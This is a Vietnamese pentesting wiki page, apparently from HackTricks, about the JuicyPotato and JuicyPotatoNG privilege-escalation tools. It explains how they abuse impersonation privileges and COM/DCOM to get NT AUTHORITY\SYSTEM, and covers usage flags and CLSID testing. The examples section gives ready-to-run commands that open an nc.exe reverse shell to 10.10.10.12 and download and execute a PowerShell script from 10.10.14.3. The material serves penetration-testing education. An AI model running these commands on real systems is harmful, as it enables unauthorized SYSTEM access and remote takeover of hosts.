# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato đã lỗi thời. Công cụ này thường hoạt động trên các phiên bản Windows đến Windows 10 1803 / Windows Server 2016. Những thay đổi Microsoft phát hành từ Windows 10 1809 / Server 2019 đã làm kỹ thuật gốc không còn hoạt động. Với các bản dựng đó và mới hơn, hãy cân nhắc các giải pháp thay thế hiện đại như PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato và các công cụ khác. Xem trang bên dưới để biết các lựa chọn và cách sử dụng mới nhất.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (lạm dụng các đặc quyền vàng) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Một phiên bản cải tiến của_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, thêm chút “nước ép”, tức là **một công cụ Local Privilege Escalation khác, giúp chuyển từ Windows Service Accounts lên NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>

#### Bạn có thể tải juicypotato tại [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Ghi chú nhanh về khả năng tương thích

- Hoạt động ổn định đến Windows 10 1803 và Windows Server 2016 khi ngữ cảnh hiện tại có SeImpersonatePrivilege hoặc SeAssignPrimaryTokenPrivilege.
- Bị Microsoft vô hiệu hóa bằng các biện pháp hardening trong Windows 10 1809 / Windows Server 2019 trở lên. Với các bản dựng này, hãy ưu tiên những lựa chọn thay thế được liên kết ở trên.

### Tóm tắt <a href="#summary" id="summary"></a>

[**Trích từ Readme của Juicy Potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) và các [biến thể](https://github.com/decoder-it/lonelypotato) của nó khai thác chuỗi leo thang đặc quyền dựa trên dịch vụ [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>), [dịch vụ](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) có MiTM listener tại `127.0.0.1:6666`, khi bạn có đặc quyền `SeImpersonate` hoặc `SeAssignPrimaryToken`. Trong quá trình đánh giá một bản dựng Windows, chúng tôi phát hiện một thiết lập trong đó `BITS` bị vô hiệu hóa có chủ đích và cổng `6666` đã được sử dụng.

Chúng tôi quyết định vũ khí hóa [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Hãy chào đón Juicy Potato**.

> Để tìm hiểu lý thuyết, xem [Rotten Potato - Leo thang đặc quyền từ Service Accounts lên SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) và lần theo chuỗi liên kết cùng tài liệu tham khảo.<sup>[[4]](#references)</sup>

Ngoài `BITS`, có thể lạm dụng một số COM server. Chúng chỉ cần:

1. có thể được khởi tạo bởi người dùng hiện tại, thường là “service user” có đặc quyền impersonation
2. triển khai giao diện `IMarshal`
3. chạy với tư cách người dùng có đặc quyền cao (SYSTEM, Administrator, …)

Sau một số thử nghiệm, chúng tôi đã thu thập và kiểm tra một danh sách phong phú các [CLSID đáng chú ý](http://ohpe.it/juicy-potato/CLSID/) trên một số phiên bản Windows.

### Chi tiết về Juicy <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato cho phép bạn:<sup>[[1]](#references)</sup>

- **Target CLSID** _chọn CLSID bất kỳ._ [_Tại đây_](http://ohpe.it/juicy-potato/CLSID/) _có danh sách được sắp xếp theo OS._
- **COM Listening port** _chọn cổng COM listening mà bạn muốn (thay vì cổng 6666 được hardcode trong marshalled)_
- **COM Listening IP address** _bind server vào bất kỳ IP nào_
- **Process creation mode** _tùy theo đặc quyền của người dùng bị impersonate, bạn có thể chọn:_
  - `CreateProcessWithToken` (cần `SeImpersonate`)
  - `CreateProcessAsUser` (cần `SeAssignPrimaryToken`)
  - `both`
- **Process to launch** _chạy một executable hoặc script nếu khai thác thành công_
- **Process Argument** _tùy chỉnh các tham số của process được chạy_
- **RPC Server address** _để hoạt động kín đáo, bạn có thể xác thực với một RPC server bên ngoài_
- **RPC Server port** _hữu ích nếu bạn muốn xác thực với server bên ngoài và firewall đang chặn cổng `135`…_
- **TEST mode** _chủ yếu dùng để kiểm thử, chẳng hạn kiểm tra CLSID. Chế độ này tạo DCOM và in ra người dùng của token. Xem_ [_tại đây để kiểm thử_](http://ohpe.it/juicy-potato/Test/)

### Cách sử dụng <a href="#usage" id="usage"></a>

```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```

### Những suy nghĩ cuối cùng <a href="#final-thoughts" id="final-thoughts"></a>

[**Từ Readme của juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

Nếu người dùng có quyền `SeImpersonate` hoặc `SeAssignPrimaryToken` thì bạn có quyền **SYSTEM**.

Gần như không thể ngăn chặn việc lạm dụng tất cả các COM Server này. Bạn có thể cân nhắc sửa đổi quyền của các đối tượng này thông qua `DCOMCNFG`, nhưng chúc may mắn — việc này sẽ rất khó khăn.

Giải pháp thực sự là bảo vệ các tài khoản và ứng dụng nhạy cảm chạy dưới các tài khoản `* SERVICE`. Vô hiệu hóa `DCOM` chắc chắn sẽ ngăn chặn được khai thác này, nhưng có thể ảnh hưởng nghiêm trọng đến hệ điều hành nền tảng.

Nguồn: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG tái giới thiệu kỹ thuật leo thang đặc quyền cục bộ kiểu JuicyPotato trên các phiên bản Windows hiện đại bằng cách kết hợp:<sup>[[2]](#references)</sup>
- DCOM OXID resolution đến một RPC server cục bộ trên cổng được chọn, tránh listener cũ được hardcode tại 127.0.0.1:6666.
- Một SSPI hook để thu thập và mạo danh xác thực SYSTEM gửi đến mà không cần RpcImpersonateClient; cách này cũng cho phép dùng CreateProcessAsUser khi chỉ có SeAssignPrimaryTokenPrivilege.
- Các thủ thuật đáp ứng những ràng buộc kích hoạt DCOM (ví dụ: yêu cầu trước đây về nhóm INTERACTIVE khi nhắm đến các lớp PrintNotify / ActiveX Installer Service).

Các lưu ý quan trọng (hành vi thay đổi giữa các bản dựng):<sup>[[2]](#references)</sup>
- Tháng 9 năm 2022: Kỹ thuật ban đầu hoạt động trên các mục tiêu Windows 10/11 và Server được hỗ trợ bằng cách dùng “INTERACTIVE trick”.
- Bản cập nhật từ các tác giả vào tháng 1 năm 2023: Sau đó, Microsoft đã chặn INTERACTIVE trick. Theo bài đăng của họ, một CLSID khác ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) khôi phục khả năng khai thác, nhưng chỉ trên Windows 11 / Server 2022.

Cách sử dụng cơ bản (xem trợ giúp để biết thêm các flag):

```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"  
# Useful helpers:  
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)  
#  -s  Scan for a COM port not filtered by Windows Defender Firewall  
#  -i  Interactive console (only with CreateProcessAsUser)
```

Nếu nhắm đến Windows 10 1809 / Server 2019, nơi JuicyPotato cổ điển đã bị vá, hãy ưu tiên các phương án thay thế được liên kết ở đầu (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, v.v.). NG có thể chỉ phù hợp trong một số trường hợp, tùy thuộc vào build và trạng thái dịch vụ.

## Ví dụ

Lưu ý: Truy cập [trang này](https://ohpe.it/juicy-potato/CLSID/) để xem danh sách CLSID có thể thử.

### Mở reverse shell bằng nc.exe

```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```

### Powershell rev

```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```

### Khởi chạy CMD mới (nếu bạn có quyền truy cập RDP)

![Powershell rev - Khởi chạy CMD mới (nếu bạn có quyền truy cập RDP): Khởi chạy CMD mới (nếu bạn có quyền truy cập RDP)](<../../images/image (300).png>)

## Sự cố CLSID

Thông thường, CLSID mặc định mà JuicyPotato sử dụng **không hoạt động** và exploit thất bại. Thường cần thử nhiều lần mới tìm được **CLSID hoạt động**. Để lấy danh sách CLSID cần thử cho một hệ điều hành cụ thể, hãy truy cập trang này:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Kiểm tra CLSID**

Trước tiên, bạn cần một số executable ngoài juicypotato.exe.

Tải [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) và nạp nó vào phiên PS của bạn, sau đó tải và thực thi [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Script này sẽ tạo danh sách CLSID có thể thử.

Tiếp theo, tải [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(thay đổi đường dẫn đến danh sách CLSID và executable juicypotato), rồi thực thi nó. Script sẽ lần lượt thử từng CLSID, và **khi số cổng thay đổi, điều đó có nghĩa là CLSID đã hoạt động**.

**Kiểm tra** các CLSID hoạt động **bằng tham số -c**

## References

- [1] [README của Juicy Potato (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Trao cho JuicyPotato cơ hội thứ hai: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Trang dự án Juicy Potato (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Leo thang đặc quyền từ tài khoản dịch vụ lên SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
